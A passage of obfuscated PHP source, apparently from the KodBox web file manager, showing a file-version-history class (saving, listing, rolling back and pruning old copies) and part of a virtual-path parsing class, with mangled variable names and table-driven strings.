(isset($GLOBALS[$”ÂúŒÊ¿[1364]]) && $GLOBALS[$”ÂúŒÊ¿[1364]]) { return; } $½±Æ–ï÷ = KodIO::parse($ñŞ´¨ˆ“); $Ùƒ×Îºû = $½±Æ–ï÷[$”ÂúŒÊ¿[43]]; $§á…º‡ = !$Ùƒ×Îºû || $Ùƒ×Îºû == KodIO::KOD_IO || $Ùƒ×Îºû == KodIO::KOD_SHARE_ITEM; if (!$§á…º‡ || !$½±Æ–ï÷[$”ÂúŒÊ¿[1365]]) { return !1; } if (substr($ñŞ´¨ˆ“, 0, strlen(DATA_PATH . $”ÂúŒÊ¿[1366])) == DATA_PATH . $”ÂúŒÊ¿[1366]) { return !1; } if ($Ùƒ×Îºû == KodIO::KOD_SHARE_ITEM) { $¿ŠÏÛ·à = IO::init($ñŞ´¨ˆ“); if ($¿ŠÏÛ·à->pathParse[$”ÂúŒÊ¿[1278]]) { return self::parsePath($¿ŠÏÛ·à->pathParse[$”ÂúŒÊ¿[1278]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $¯îÂ¢±¤ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $”ÂúŒÊ¿[1367]); foreach ($¯îÂ¢±¤ as $””èÛ¸¶) { if (!$Ùƒ×Îºû && substr($ñŞ´¨ˆ“, 0, strlen($””èÛ¸¶)) == $””èÛ¸¶) { return !1; } } self::log($GLOBALS[$”ÂúŒÊ¿[1272]] . $”ÂúŒÊ¿[1368] . $ñŞ´¨ˆ“); return $ñŞ´¨ˆ“; } private static function pathHistory($Ì¾ûÌŞÁ) { $ç®–¢É =& $_SERVER[ŒÅŸ‹ä†]; $‰¢˜À—€ = self::$_historyBase . ltrim(KodIO::clear($Ì¾ûÌŞÁ), $ç®–¢É[8]); $‰¢˜À—€ = str_replace(array($ç®–¢É[1369]), array($ç®–¢É[1370]), $‰¢˜À—€); return $‰¢˜À—€; } public static function log($¤¢Şâ¤ë) { } public static function historyCount($Æ¶Ë²—Ô) { $óÃâí«Ò =& $_SERVER[ŒÅŸ‹ä†]; $™ïçîÏ = array(); $‰»„¨Ğ = array(); foreach ($Æ¶Ë²—Ô as $ÒÔºòİ) { $ûÑ§ĞÔ³ = get_path_father($ÒÔºòİ); if (!$‰»„¨Ğ[$ûÑ§ĞÔ³]) { $‰»„¨Ğ[$ûÑ§ĞÔ³] = array(); } $‰»„¨Ğ[$ûÑ§ĞÔ³][] = get_path_this($ÒÔºòİ); } foreach ($‰»„¨Ğ as $ûÑ§ĞÔ³ => $›È¤°…ş) { $èªœÑ¡Û = self::parsePath($ûÑ§ĞÔ³); if (!$èªœÑ¡Û) { continue; } foreach ($›È¤°…ş as $è«š°îå) { $Û£ù¾œÁ = self::listData(rtrim($èªœÑ¡Û, $óÃâí«Ò[8]) . $óÃâí«Ò[8] . $è«š°îå, !1); if ($Û£ù¾œÁ && $Û£ù¾œÁ[$óÃâí«Ò[455]]) { $™ïçîÏ[rtrim($ûÑ§ĞÔ³, $óÃâí«Ò[8]) . $óÃâí«Ò[8] . $è«š°îå] = count($Û£ù¾œÁ[$óÃâí«Ò[455]]); } } } return $™ïçîÏ; } public static function add($÷–Üİü) { $¦àòÕĞ =& $_SERVER[ŒÅŸ‹ä†]; $É®¿¼Ç = self::listData($÷–Üİü); if (!$É®¿¼Ç) { return; } $ıªƒ¡¶† = Model($¦àòÕĞ[869])->get($¦àòÕĞ[1371]); $ò¨õ±äÁ = intval($GLOBALS[$¦àòÕĞ[6]][$¦àòÕĞ[102]][$¦àòÕĞ[1349]]); $’ÛÉ¨«€ = $ıªƒ¡¶† == $¦àòÕĞ[1372] ? min(5, $ò¨õ±äÁ) : $ò¨õ±äÁ; if ($ò¨õ±äÁ <= 0) { return; } $–°°° ˜ = IO::info($÷–Üİü); $Ş÷»øŠû = $É®¿¼Ç[$¦àòÕĞ[455]]; if ($–°°° ˜[$¦àòÕĞ[89]] == 0) { return; } if ($–°°° ˜[$¦àòÕĞ[89]] >= 1024 * 1024 * 500) { return !1; } $îÈç“ˆ¡ = IO::hashSimple($÷–Üİü); if ($Ş÷»øŠû && $Ş÷»øŠû[0][$¦àòÕĞ[700]] == $îÈç“ˆ¡) { return !0; } if (array_key_exists($¦àòÕĞ[244], $–°°° ˜) && !$–°°° ˜[$¦àòÕĞ[244]]) { return !1; } $ã†í¦‰ = short_id(time()); $†Ó¯şûÆ = array($¦àòÕĞ[492] => $ã†í¦‰, $¦àòÕĞ[700] => $îÈç“ˆ¡, $¦àòÕĞ[42] => $–°°° ˜[$¦àòÕĞ[42]] . $¦àòÕĞ[10] . date($¦àòÕĞ[1373]) . rand_string(1), $¦àòÕĞ[89] => $–°°° ˜[$¦àòÕĞ[89]], $¦àòÕĞ[546] => USER_ID, $¦àòÕĞ[242] => time(), $¦àòÕĞ[1374] => $¦àòÕĞ[12]); IO::mkdir($É®¿¼Ç[$¦àòÕĞ[1375]]); $€à”€Ú = IO::copy($÷–Üİü, $É®¿¼Ç[$¦àòÕĞ[1375]], !1, $†Ó¯şûÆ[$¦àòÕĞ[42]]); if (!$€à”€Ú) { self::clearEmptyFolder($É®¿¼Ç[$¦àòÕĞ[1375]]); return !1; } array_unshift($Ş÷»øŠû, $†Ó¯şûÆ); if (count($Ş÷»øŠû) > $’ÛÉ¨«€) { $Î‡ˆñàÍ = array_slice($Ş÷»øŠû, $’ÛÉ¨«€); foreach ($Î‡ˆñàÍ as $¢–©‰) { IO::remove($É®¿¼Ç[$¦àòÕĞ[1375]] . $¢–©‰[$¦àòÕĞ[42]]); } $Ş÷»øŠû = array_slice($Ş÷»øŠû, 0, $’ÛÉ¨«€); } return self::saveData($É®¿¼Ç[$¦àòÕĞ[1376]], $Ş÷»øŠû); } public static function remove($–µØ¾´„, $Ëö²´™ñ) { $¥úÂè´ç =& $_SERVER[ŒÅŸ‹ä†]; $šùÔà = self::listData($–µØ¾´„); $Ã»˜‡Ôº = array(); if (!$šùÔà) { return !1; } foreach ($šùÔà[$¥úÂè´ç[455]] as $·³ÑÂÏŒ) { if ($·³ÑÂÏŒ[$¥úÂè´ç[492]] == $Ëö²´™ñ) { IO::remove($šùÔà[$¥úÂè´ç[1375]] . $·³ÑÂÏŒ[$¥úÂè´ç[42]]); continue; } $Ã»˜‡Ôº[] = $·³ÑÂÏŒ; } return self::saveData($šùÔà[$¥úÂè´ç[1376]], $Ã»˜‡Ôº); } public static function clear($Ä¦¾ÒÅì, $à¶õô×Ï = true) { $®ª®È€ø =& $_SERVER[ŒÅŸ‹ä†]; $Á÷ÒàÄå = self::listData($Ä¦¾ÒÅì, $à¶õô×Ï); if (!$Á÷ÒàÄå) { return !1; } foreach ($Á÷ÒàÄå[$®ª®È€ø[455]] as $¸òçë‚ê) { IO::remove($Á÷ÒàÄå[$®ª®È€ø[1375]] . $¸òçë‚ê[$®ª®È€ø[42]]); } return self::saveData($Á÷ÒàÄå[$®ª®È€ø[1376]], array()); } public static function moveHistory($¿ú­»­¿, $âæ²±ïñ = '', $—–©º… = '') { $ÌşÜáĞË =& $_SERVER[ŒÅŸ‹ä†]; $¶ú º· = self::listData($¿ú­»­¿, !1); if (!$¶ú º· || !$¶ú º·[$ÌşÜáĞË[455]]) { return !1; } $ËÇ¿ãŸ© = $ÌşÜáĞË[1363]; $âæ²±ïñ = $âæ²±ïñ ? $âæ²±ïñ : get_path_this($¿ú­»­¿); $—–©º… = $—–©º… ? $—–©º… : $¶ú º·[$ÌşÜáĞË[1375]]; $èõµÚ¦‰ = substr(get_path_this($¶ú º·[$ÌşÜáĞË[1376]]), 0, -strlen($ËÇ¿ãŸ©)); foreach ($¶ú º·[$ÌşÜáĞË[455]] as $ËÍå‡ò => $ÙÜÅğ›İ) { $âÚ¬½ùò = $âæ²±ïñ . substr($ÙÜÅğ›İ[$ÌşÜáĞË[42]], strlen($èõµÚ¦‰)); $„×Åß˜î = IO::move($¶ú º·[$ÌşÜáĞË[1375]] . $ÙÜÅğ›İ[$ÌşÜáĞË[42]], $—–©º…, !1, $âÚ¬½ùò); if ($„×Åß˜î) { $¶ú º·[$ÌşÜáĞË[455]][$ËÍå‡ò][$ÌşÜáĞË[42]] = $âÚ¬½ùò; } } $¶ú º·[$ÌşÜáĞË[1376]] = IO::move($¶ú º·[$ÌşÜáĞË[1376]], $—–©º…, !1, $âæ²±ïñ . $ËÇ¿ãŸ©); self::saveData($¶ú º·[$ÌşÜáĞË[1376]], $¶ú º·[$ÌşÜáĞË[455]]); self::clearEmptyFolder($¶ú º·[$ÌşÜáĞË[1375]]); } public static function rollback($‰”ÃÜ®º, $ÀÉĞÍ­) { $Œô“Œæİ =& $_SERVER[ŒÅŸ‹ä†]; $ÖáË ïü = self::listData($‰”ÃÜ®º); if (!$ÖáË ïü) { return; } $êİ°ë“¸ = IO::info($‰”ÃÜ®º); foreach ($ÖáË ïü[$Œô“Œæİ[455]] as $Â‡™®ÑÆ => $ñ¸Ã³·É) { if ($ñ¸Ã³·É[$Œô“Œæİ[492]] == $ÀÉĞÍ­) { self::add($‰”ÃÜ®º); $›ñÖî¢ = $ÖáË ïü[$Œô“Œæİ[1375]] . $ñ¸Ã³·É[$Œô“Œæİ[42]]; $©üúŒÜ = IO::copy($›ñÖî¢, IO::pathFather($‰”ÃÜ®º), REPEAT_REPLACE, $êİ°ë“¸[$Œô“Œæİ[42]]); if ($©üúŒÜ) { self::remove($‰”ÃÜ®º, $ÀÉĞÍ­); } return $©üúŒÜ; } } return !1; } public static function setDetail($§éŞü®æ, $Å¶Şçü, $çÌé¾Ú´) { $‡¹¥©ÆÈ =& $_SERVER[ŒÅŸ‹ä†]; $ıùøĞ× = self::listData($§éŞü®æ); if (!$ıùøĞ×) { return; } foreach ($ıùøĞ×[$‡¹¥©ÆÈ[455]] as $ÜâÄ¡ÊË => $ª’¹ëí’) { if ($ª’¹ëí’[$‡¹¥©ÆÈ[492]] == $Å¶Şçü) { $ıùøĞ×[$‡¹¥©ÆÈ[455]][$ÜâÄ¡ÊË][$‡¹¥©ÆÈ[1374]] = $çÌé¾Ú´; self::saveData($ıùøĞ×[$‡¹¥©ÆÈ[1376]], $ıùøĞ×[$‡¹¥©ÆÈ[455]]); return !0; } } return !1; } public static function fileInfo($œ£§µÒÊ, $ã¸„œöó) { $ñ¡¨Õ—ö =& $_SERVER[ŒÅŸ‹ä†]; $Ù¬£Çú— = self::listData($œ£§µÒÊ); if (!$Ù¬£Çú—) { show_json(LNG($ñ¡¨Õ—ö[116]), !1); } $ÁÉà³êæ = $ñ¡¨Õ—ö[12]; foreach ($Ù¬£Çú—[$ñ¡¨Õ—ö[455]] as $«ı§–ïñ => $¾¡¼Ü) { if ($¾¡¼Ü[$ñ¡¨Õ—ö[492]] != $ã¸„œöó) { continue; } $ÁÉà³êæ = $Ù¬£Çú—[$ñ¡¨Õ—ö[1375]] . $¾¡¼Ü[$ñ¡¨Õ—ö[42]]; break; } if (!$ÁÉà³êæ) { show_json(LNG($ñ¡¨Õ—ö[116]), !1); } return IO::info($ÁÉà³êæ); } public static function fileOut($”ÓÏøÌ, $øçÜá¦£, $©©é…Ñ = false) { $òÔ˜Û†¥ =& $_SERVER[ŒÅŸ‹ä†]; $ñé·˜ğã = self::fileInfo($”ÓÏøÌ, $øçÜá¦£); $´Ÿ˜ºÖ¾ =& $GLOBALS[$òÔ˜Û†¥[7]]; $©©é…Ñ = isset($´Ÿ˜ºÖ¾[$òÔ˜Û†¥[1326]]) && $´Ÿ˜ºÖ¾[$òÔ˜Û†¥[1326]] == 1; if (isset($´Ÿ˜ºÖ¾[$òÔ˜Û†¥[43]]) && $´Ÿ˜ºÖ¾[$òÔ˜Û†¥[43]] == $òÔ˜Û†¥[1377]) { return IO::fileOutImage($ñé·˜ğã[$òÔ˜Û†¥[97]], $´Ÿ˜ºÖ¾[$òÔ˜Û†¥[1378]]); } IO::fileOut($ñé·˜ğã[$òÔ˜Û†¥[97]], $©©é…Ñ, get_path_this($”ÓÏøÌ)); } public static function listData($Ç‡¸ªÓ¿, $İ„õİÒƒ = true) { $‹Ö¢šé =& $_SERVER[ŒÅŸ‹ä†]; if ($İ„õİÒƒ && !IO::exist($Ç‡¸ªÓ¿)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($Ç‡¸ªÓ¿, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $ı¡ÛŠÖõ = self::pathHistory($Ç‡¸ªÓ¿); $•Ê¯„â¶ = array($‹Ö¢šé[1376] => $ı¡ÛŠÖõ . $‹Ö¢šé[1363], $‹Ö¢šé[1375] => rtrim(get_path_father($ı¡ÛŠÖõ), $‹Ö¢šé[8]) . $‹Ö¢šé[8], $‹Ö¢šé[455] => array()); $ºÔ°¹ = IO::getContent($•Ê¯„â¶[$‹Ö¢šé[1376]]); if ($ºÔ°¹) { $º²‡ŸÏ¹ = json_decode($ºÔ°¹, !0); if (is_array($º²‡ŸÏ¹)) { $•Ê¯„â¶[$‹Ö¢šé[455]] = $º²‡ŸÏ¹; } } return $•Ê¯„â¶; } private static function saveData($”õÁ¬Åµ, $„üÃçú) { $É¦ü¢»½ =& $_SERVER[ŒÅŸ‹ä†]; self::log($É¦ü¢»½[1379] . $”õÁ¬Åµ . $É¦ü¢»½[84] . count($„üÃçú), $É¦ü¢»½[848]); if ($„üÃçú) { return IO::setContent($”õÁ¬Åµ, json_encode($„üÃçú)); } $şÙÑôä = IO::pathFather($”õÁ¬Åµ); IO::remove($”õÁ¬Åµ); self::clearEmptyFolder($şÙÑôä); return !0; } public static function clearEmptyFolder($·©ä‡) { $»÷äĞÚà =& $_SERVER[ŒÅŸ‹ä†]; if (trim($·©ä‡, $»÷äĞÚà[8]) == trim(self::$_historyBase, $»÷äĞÚà[8])) { return; } $õ½ÚŒİ = IO::pathFather($·©ä‡); $™Ä¬»¥à = IO::has($·©ä‡, !0); if ($™Ä¬»¥à[$»÷äĞÚà[250]] > 0 || $™Ä¬»¥à[$»÷äĞÚà[251]] > 0) { return; } IO::remove($·©ä‡); self::clearEmptyFolder($õ½ÚŒİ); } private static function getBasePath() { $·Ùı¼·™ =& $_SERVER[ŒÅŸ‹ä†]; $şØİºŸ = Model($·Ùı¼·™[1380])->get($·Ùı¼·™[1381]); if ($şØİºŸ) { if (!IO::exist($şØİºŸ)) { IO::mkdir($şØİºŸ); } if (get_path_this($şØİºŸ) == $·Ùı¼·™[1366]) { $†›Ïıô = $·Ùı¼·™[1382] . rand_string(8); @rename($şØİºŸ, get_path_father($şØİºŸ) . $·Ùı¼·™[8] . $†›Ïıô); $şØİºŸ = DATA_PATH . $†›Ïıô . $·Ùı¼·™[8]; file_put_contents(DATA_PATH . $·Ùı¼·™[1314], $·Ùı¼·™[12]); Model($·Ùı¼·™[1380])->set($·Ùı¼·™[1381], $şØİºŸ); } return $şØİºŸ; } $şØİºŸ = DATA_PATH . $·Ùı¼·™[1382] . rand_string(8) . $·Ùı¼·™[8]; $şØİºŸ = IO::mkdir($şØİºŸ); $şØİºŸ = rtrim($şØİºŸ, $·Ùı¼·™[8]) . $·Ùı¼·™[8]; file_put_contents($şØİºŸ . $·Ùı¼·™[1314], $·Ùı¼·™[12]); file_put_contents(DATA_PATH . $·Ùı¼·™[1314], $·Ùı¼·™[12]); Model($·Ùı¼·™[1380])->set($·Ùı¼·™[1381], $şØİºŸ); return $şØİºŸ; } } class KodIO { const KOD_SOURCE = "\173\163\x6f\165\x72\143\x65\175"; const KOD_USER_RECYCLE = "\x7b\165\x73\x65\x72\x52\145\x63\x79\x63\154\145\x7d"; const KOD_USER_FAV = "\173\x75\x73\x65\x72\106\141\x76\x7d"; const KOD_USER_FILE_TAG = "\173\x75\163\x65\162\x46\151\154\x65\124\x61\x67\x7d"; const KOD_USER_FILE_TYPE = "\x7b\x75\163\145\x72\x46\x69\154\145\124\171\x70\145\x7d"; const KOD_GROUP_ROOT_SELF = "\173\x67\162\157\x75\160\122\x6f\x6f\164\123\x65\x6c\146\x7d"; const KOD_USER_SHARE = "\x7b\x75\163\x65\x72\x53\150\x61\x72\145\175"; const KOD_USER_SHARE_LINK = "\173\x75\163\145\x72\123\150\x61\162\x65\x4c\151\156\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\173\163\x68\141\x72\x65\x54\x6f\x4d\145\175"; const KOD_SHARE_ITEM = "\x7b\x73\x68\x61\162\x65\111\x74\145\x6d\x7d"; const KOD_SHARE_LINK = "\173\x73\150\x61\162\x65\111\164\145\155\114\151\156\153\x7d"; const KOD_SHARE_OUTER = "\173\x73\x68\x61\162\x65\x49\x74\145\x6d\117\165\164\175"; const KOD_SEARCH = "\173\x73\x65\x61\162\143\x68\175"; const KOD_BLOCK = "\173\142\154\x6f\143\153\x7d"; const KOD_IO = "\173\151\157\x7d"; const KOD_USER_RECENT = "\x7b\165\x73\x65\162\122\145\156\x63\x65\x6e\x74\175"; const KOD_USER_DRIVER = "\173\x64\162\151\166\x65\162\175"; public static function typeList() { $‘Ô°Û› =& $_SERVER[ŒÅŸ‹ä†]; return array($‘Ô°Û›[1383] => self::KOD_SOURCE, $‘Ô°Û›[1384] => self::KOD_USER_RECYCLE, $‘Ô°Û›[1385] => self::KOD_USER_FAV, $‘Ô°Û›[1386] => self::KOD_USER_FILE_TAG, $‘Ô°Û›[1387] => self::KOD_USER_FILE_TYPE, $‘Ô°Û›[1388] => self::KOD_GROUP_ROOT_SELF, $‘Ô°Û›[1389] => self::KOD_USER_SHARE, $‘Ô°Û›[1390] => self::KOD_USER_SHARE_LINK, $‘Ô°Û›[1391] => self::KOD_USER_SHARE_TO_ME, $‘Ô°Û›[1392] => self::KOD_SHARE_ITEM, $‘Ô°Û›[1393] => self::KOD_SHARE_LINK, $‘Ô°Û›[1394] => self::KOD_SHARE_OUTER, $‘Ô°Û›[1395] => self::KOD_SEARCH, $‘Ô°Û›[1396] => self::KOD_BLOCK, $‘Ô°Û›[1397] => self::KOD_IO, $‘Ô°Û›[1398] => self::KOD_USER_RECENT, $‘Ô°Û›[1399] => self::KOD_USER_DRIVER); } public static function parse($‘ÒÓµìİ) { $œ™÷Šœ˜ =& $_SERVER[ŒÅŸ‹ä†]; $‘ÒÓµìİ = self::clear($‘ÒÓµìİ); $­«µ®§Ê = array_values(self::typeList()); preg_match($œ™÷Šœ˜[1400], $‘ÒÓµìİ, $ä¹ÜßõŒ); $ìÌØŸÁ¢ = array($œ™÷Šœ˜[516] => !1, $œ™÷Šœ˜[1401] => !1, $œ™÷Šœ˜[513] => !1, $œ™÷Šœ˜[97] => $‘ÒÓµìİ, $œ™÷Šœ˜[1298] => !1, $œ™÷Šœ˜[1297] => $œ™÷Šœ˜[12]); if (is_array($ä¹ÜßõŒ) && count($ä¹ÜßõŒ) == 5) { $¤í¾â¼ = $œ™÷Šœ˜[1402] . $ä¹ÜßõŒ[2] . $œ™÷Šœ˜[412]; if (in_array($¤í¾â¼, $­«µ®§Ê)) { $ìÌØŸÁ¢[$œ™÷Šœ˜[1298]] = $ä¹ÜßõŒ[1]; $ìÌØŸÁ¢[$œ™÷Šœ˜[43]] = $¤í¾â¼; $ìÌØŸÁ¢[$œ™÷Šœ˜[1403]] = substr($¤í¾â¼, 1, -1); $ìÌØŸÁ¢[$œ™÷Šœ˜[492]] = $ä¹ÜßõŒ[3]; } $ìÌØŸÁ¢[$œ™÷Šœ˜[1297]] = $ä¹ÜßõŒ[4]; } if ($ìÌØŸÁ¢[$œ™÷Šœ˜[516]] == self::KOD_SOURCE) { $ìÌØŸÁ¢[$œ™÷Šœ˜[492]] = intval($ìÌØŸÁ¢[$œ™÷Šœ˜[492]]); $ìÌØŸÁ¢[$œ™÷Šœ˜[1301]] = $ìÌØŸÁ¢[$œ™÷Šœ˜[492]]; } $‚›Œ÷–Ç = array($œ™÷Šœ˜[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_SHARE_OUTER, self::KOD_USER_DRIVER); $ìÌØŸÁ¢[$œ™÷Šœ˜[1365]] = in_array($ìÌØŸÁ¢[$œ™÷Šœ˜[43]], $‚›Œ÷–Ç); return $ìÌØŸÁ¢; } public static function isTruePath($šŒ¯„¯Ş) { $’ÛÏÅš =& $_SERVER[ŒÅŸ‹ä†]; if (substr($šŒ¯„¯Ş, 0, 1) != $’ÛÏÅš[1402]) { return !0; } if (strpos($šŒ¯„¯Ş, $’ÛÏÅš[503]) === 0) { return !0; } if (strpos($šŒ¯„¯Ş, $’ÛÏÅš[1369]) === 0) { return !0; } if (strpos($šŒ¯„¯Ş, $’ÛÏÅš[1404]) === 0) { return !0; } if (strpos($šŒ¯„¯Ş, $’ÛÏÅš[1405]) === 0) { return !0; } if (strpos($šŒ¯„¯Ş, $’ÛÏÅš[1406]) === 0) { return !0; } if (strpos($šŒ¯„¯Ş, $’ÛÏÅš[1407]) === 0) { return !0; } return !1; } public static function clear($à·ÅÖ¡¾) { $¯úóì á =& $_SERVER[ŒÅŸ‹ä†]; $à·ÅÖ¡¾ = str_replace(array($¯úóì á[1191], $¯úóì á[18]), $¯úóì á[63], $à·ÅÖ¡¾); $à·ÅÖ¡¾ = str_replace($¯úóì á[108], $¯úóì á[8], $à·ÅÖ¡¾); $ı¬ËÔõì = $¯úóì á[1408]; if (substr($à·ÅÖ¡¾, 0, 3) == $¯úóì á[1409]) { $à·ÅÖ¡¾ = substr($à·ÅÖ¡¾, 3); } while (strstr($à·ÅÖ¡¾, $ı¬ËÔõì)) { $à·ÅÖ¡¾ = str_replace($ı¬ËÔõì, $¯úóì á[8], $à·ÅÖ¡¾); } $à·ÅÖ¡¾ = preg_replace($¯úóì á[1410], $¯úóì á[8], $à·ÅÖ¡¾); if ($à·ÅÖ¡¾ == $¯úóì á[8]) { return $¯úóì á[8]; } $à·ÅÖ¡¾ = rtrim($à·ÅÖ¡¾, $¯úóì á[8]); return $à·ÅÖ¡¾; } public static function pathTrue($š…ƒÎ”â) { $û¥ ¹˜„ =& $_SERVER[ŒÅŸ‹ä†]; if (!$š…ƒÎ”â) { return $û¥ ¹˜„[12]; } $š…ƒÎ”â = str_replace($û¥ ¹˜„[265], $û¥ ¹˜„[8], str_replace($û¥ ¹˜„[1411], $û¥ ¹˜„[8], $š…ƒÎ”â)); $š…ƒÎ”â = str_replace($û¥ ¹˜„[265], $û¥ ¹˜„[8], str_replace($û¥ ¹˜„[1411], $û¥ ¹˜„[8], $š…ƒÎ”â)); if (!strstr($š…ƒÎ”â, $û¥ ¹˜„[1409])) { return $š…ƒÎ”â; } $˜óú¼«£ = explode($û¥ ¹˜„[8], $š…ƒÎ”â); foreach ($˜óú¼«£ as $»ô¹Á·Ø => $ƒŒŸİÖö) { if ($ƒŒŸİÖö !== $û¥ ¹˜„[1412]) { continue; } for ($‹šèàıã = $»ô¹Á·Ø; $‹šèàıã >= 0; $‹šèàıã--) { if ($˜óú¼«£[$‹šèàıã] === $û¥ ¹˜„[10] || $˜óú¼«£[$‹šèàıã] === $û¥ ¹˜„[1412] || $˜óú¼«£[$‹šèàıã] === -1) { continue; } if ($˜óú¼«£[$‹šèàıã] === $û¥ ¹˜„[12]) { $˜óú¼«£[$»ô¹Á·Ø] = -1; break; } $˜óú¼«£[$»ô¹Á·Ø] = -1; $˜óú¼«£[$‹šèàıã] = -1; break; } } $ „‚æÉ° = array(); foreach ($˜óú¼«£ as $ƒŒŸİÖö) { if ($ƒŒŸİÖö !== -1) { $ „‚æÉ°[] = $ƒŒŸİÖö; } } $°¨çÖ¶‘ = implode($û¥ ¹˜„[8], $ „‚æÉ°); if (strpos($°¨çÖ¶‘, $û¥ ¹˜„[1413]) === 0) { $°¨çÖ¶‘ = $û¥ ¹˜„[1409] . substr($°¨çÖ¶‘, strlen($û¥ ¹˜„[1413])); } return $°¨çÖ¶‘; } public static function pathUrlClear($•Û‡ë¡Ú) { $£ÕñÌ‘ =& $_SERVER[ŒÅŸ‹ä†]; if (!$•Û‡ë¡Ú) { return $•Û‡ë¡Ú; } $•Û‡ë¡Ú = rawurldecode($•Û‡ë¡Ú); $•Û‡ë¡Ú = str_replace($£ÕñÌ‘[1411], $£ÕñÌ‘[8], $•Û‡ë¡Ú); if (strpos($•Û‡ë¡Ú, $£ÕñÌ‘[86]) > 0) { $•Û‡ë¡Ú = substr($•Û‡ë¡Ú, 0, strpos($•Û‡ë¡Ú, $£ÕñÌ‘[86])); } if (strpos($•Û‡ë¡Ú, $£ÕñÌ‘[1414]) > 0) { $•Û‡ë¡Ú = substr($•Û‡ë¡Ú, 0, strpos($•Û‡ë¡Ú, $£ÕñÌ‘[1414])); } return $•Û‡ë¡Ú; } public static function sourceID($ôã¹±îï) { $à£ôƒ‡ =& $_SERVER[ŒÅŸ‹ä†]; $¼ë‡‹Ü = self::parse($ôã¹±îï); if ($¼ë‡‹Ü[$à£ôƒ‡[43]] !== self::KOD_SOURCE) { show_json(LNG($à£ôƒ‡[1415]), !1); } return $¼ë‡‹Ü[$à£ôƒ‡[492]]; } public static function make($‡ôøÚÀ‰) { if (!$‡ôøÚÀ‰) { return !1; } return self::makePath(self::KOD_SOURCE, intval($‡ôøÚÀ‰)); } public static function makeShare($ø¥î›çÅ, $Ù¾â’îš) { return self::makePath(self::KOD_SHARE_ITEM, $ø¥î›çÅ, $Ù¾â’îš); } public static function makeFileTypePath($’äºà) { return self::makePath(self::KOD_USER_FILE_TYPE, $’äºà); } public static function makeFileTagPath($ƒùé·«Ü) { return self::makePath(self::KOD_USER_FILE_TAG, $ƒùé·«Ü); } public static function makePath($¢ºÄ§á, $ò×Ñˆ = '', $²°¹ÌÕ = '') { $º…ã‹ª¯ =& $_SERVER[ŒÅŸ‹ä†]; $Ê¤áœñ¶ = substr($¢ºÄ§á, 1, -1); $ÙÆ«úîø = $º…ã‹ª¯[1416] . $Ê¤áœñ¶ . $º…ã‹ª¯[1417] . $ò×Ñˆ . $º…ã‹ª¯[1418]; $ÙÆ«úîø = $²°¹ÌÕ ? $ÙÆ«úîø . $²°¹ÌÕ . $º…ã‹ª¯[8] : $ÙÆ«úîø; return $ÙÆ«úîø; } public static function hashPath($ë‚ç®‰ , $õ‰Ù·ãæ = false) { $²º‰¸‚à =& $_SERVER[ŒÅŸ‹ä†]; if (!$ë‚ç®‰ ) { return $²º‰¸‚à[12]; } $Š¯®™ßÆ = is_array($ë‚ç®‰ ) ? $ë‚ç®‰  : IO::info($ë‚ç®‰ ); $ÇÛú¥Ëæ = _get($Š¯®™ßÆ, $²º‰¸‚à[1419], $²º‰¸‚à[12]); if (!$ÇÛú¥Ëæ && isset($Š¯®™ßÆ[$²º‰¸‚à[562]])) { $ÇÛú¥Ëæ = $Š¯®™ßÆ[$²º‰¸‚à[562]]; } if (!$ÇÛú¥Ëæ && isset($Š¯®™ßÆ[$²º‰¸‚à[246]])) { $ÇÛú¥Ëæ = trim($Š¯®™ßÆ[$²º‰¸‚à[246]], $²º‰¸‚à[129]); } if ($ÇÛú¥Ëæ) { return $ÇÛú¥Ëæ; } if (!$ÇÛú¥Ëæ && isset($Š¯®™ßÆ[$²º‰¸‚à[202]]) && $Š¯®™ßÆ[$²º‰¸‚à[202]]) { $Š¯®™ßÆ = IO::info(KodIO::make($Š¯®™ßÆ[$²º‰¸‚à[202]])); $ÇÛú¥Ëæ = _get($Š¯®™ßÆ, $²º‰¸‚à[1419], $²º‰¸‚à[12]); if (!$ÇÛú¥Ëæ && isset($Š¯®™ßÆ[$²º‰¸‚à[562]])) { $ÇÛú¥Ëæ = $Š¯®™ßÆ[$²º‰¸‚à[562]]; } } $­ò®¼áÃ = md5($Š¯®™ßÆ[$²º‰¸‚à[97]] . $Š¯®™ßÆ[$²º‰¸‚à[89]] . $Š¯®™ßÆ[$²º‰¸‚à[98]]); $ÆĞ¶ó³ª = $­ò®¼áÃ . $²º‰¸‚à[1420]; $ÇÛú¥Ëæ = $ÇÛú¥Ëæ ? $ÇÛú¥Ëæ : Cache::get($ÆĞ¶ó³ª); if (!$ÇÛú¥Ëæ && $õ‰Ù·ãæ) { $ÇÛú¥Ëæ = IO::hashSimple($Š¯®™ßÆ[$²º‰¸‚à[97]]); Cache::set($ÆĞ¶ó³ª, $ÇÛú¥Ëæ ? $ÇÛú¥Ëæ : $­ò®¼áÃ, 3600 * 24 * 30); } return $ÇÛú¥Ëæ ? $ÇÛú¥Ëæ : $­ò®¼áÃ; } public static function hashPathSafe($‘¢ûîœş, $á÷öšœí = false) { $ÆÏÄñˆ˜ =& $_SERVER[ŒÅŸ‹ä†]; $Äë±ú‰ï = self::hashPath($‘¢ûîœş, $á÷öšœí); return md5($Äë±ú‰ï . $ÆÏÄñˆ˜[1421] . Model($ÆÏÄñˆ˜[869])->get($ÆÏÄñˆ˜[870])); } public static function initSystemPath() { $–¼ÍÂ”Ù =& $_SERVER[ŒÅŸ‹ä†]; if (defined($–¼ÍÂ”Ù[1422])) { return; } define($–¼ÍÂ”Ù[1422], self::systemPath($–¼ÍÂ”Ù[200])); define($–¼ÍÂ”Ù[1423], self::systemPath($–¼ÍÂ”Ù[1424])); define($–¼ÍÂ”Ù[1425], self::systemPath($–¼ÍÂ”Ù[1426])); define($–¼ÍÂ”Ù[1427], self::systemPath($–¼ÍÂ”Ù[1428])); IOHistory::bindEvent(); } public static function systemPath($ëïÌÏìä) { $Ù§ş×ó° =& $_SERVER[ŒÅŸ‹ä†]; $±ºşÜù = $Ù§ş×ó°[1429] . ucfirst($ëïÌÏìä); $¯·Ø„Ã = Model($Ù§ş×ó°[869])->get($±ºşÜù); if ($¯·Ø„Ã) { return $¯·Ø„Ã; } if ($ëïÌÏìä == $Ù§ş×ó°[200]) { $¯·Ø„Ã = 